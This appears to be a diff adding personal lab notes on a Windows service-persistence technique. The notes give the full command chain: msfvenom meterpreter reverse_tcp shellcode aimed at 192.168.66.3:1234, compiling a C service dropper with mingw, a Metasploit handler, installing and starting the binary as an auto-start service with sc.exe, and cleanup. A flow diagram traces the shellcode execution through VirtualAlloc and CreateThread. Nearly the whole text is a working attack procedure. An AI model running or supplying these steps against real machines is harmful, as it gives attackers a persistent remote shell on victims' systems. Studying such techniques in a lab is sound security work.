@@ -1,0 +1,53 @@
+step 1:
+
+sudo su
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=192.168.66.3 \
+  LPORT=1234 \
+  EXITFUNC=thread \
+  -f c
+
+step 2:
+cd "C:\Users\MANIKANDAN\Videos\Windows Persistence Techniques"
+
+
+step 3
+complie the code
+
+x86_64-w64-mingw32-gcc service_dropper.c -o AAAServiceTest1.exe -lws2_32
+
+step 4:
+msfconsole -q
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.66.3
+set LPORT 1234
+set ExitOnSession false
+run -j
+
+STEP 5 — Deploy & Start Service
+# verify file exists
+ls "C:\Users\MANIKANDAN\Videos\Windows Persistence Techniques\AAAServiceTest1.exe"
+
+# create service
+sc.exe create AAAServiceTest1 binPath= "C:\Users\MANIKANDAN\Videos\Windows Persistence Techniques\AAAServiceTest1.exe" start= auto
+
+# start service — triggers shellcode
+sc.exe start AAAServiceTest1
+
+STEP 6 — Cleanup (Windows)
+sc.exe stop AAAServiceTest1
+sc.exe delete AAAServiceTest1
+
+
+msfvenom (Kali)
+    ↓ shellcode bytes
+service_dropper.c (Windows)
+    ↓ compile → AAAServiceTest1.exe
+sc.exe create + start
+    ↓ SCM launches exe
+ServiceMain() → VirtualAlloc → memcpy → VirtualProtect → CreateThread
+    ↓ shellcode executes
+Reverse TCP → 192.168.66.3:1234
+    ↓
+Meterpreter session on Kali
